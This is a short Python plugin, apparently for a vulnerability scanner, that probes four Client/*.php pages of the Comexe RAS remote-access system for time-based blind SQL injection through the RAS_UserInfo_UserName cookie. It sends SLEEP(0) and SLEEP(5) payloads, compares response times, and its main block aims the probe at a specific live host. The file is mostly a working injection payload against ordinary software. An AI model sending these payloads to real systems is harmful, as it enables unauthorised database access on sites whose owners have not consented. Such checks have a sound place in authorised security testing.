#!/usr/bin/env python
# -*- coding: utf-8 -*-
#科迈RAS系统四处cookie注入
import time
def assign(service, arg):
    if service == "comexe_ras":
        return True, arg

def audit(arg):
    urls = [
    "Client/CmxList.php",
    "Client/CmxLogin.php",
    "Client/CmxUpdate.php",
    "Client/CmxSupport.php"
    ]
    for url in urls:
        url = arg + url
        cookie = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(0)))JarV)%20AND%20'aSBL'='aSBL"
        cookie1 = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20'aSBL'='aSBL"
        t1 = time.time()
        code1,_,_,_,_ = curl.curl2(url,cookie=cookie)
        true_time = time.time() - t1
        t2 = time.time()
        code2,_,res,_,_ = curl.curl2(url,cookie=cookie1)
        false_time = time.time() - t2
        if code1==200 and code2 == 200 and false_time-true_time>4.5:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('comexe_ras', 'http://ras4.aupu.net/')[1])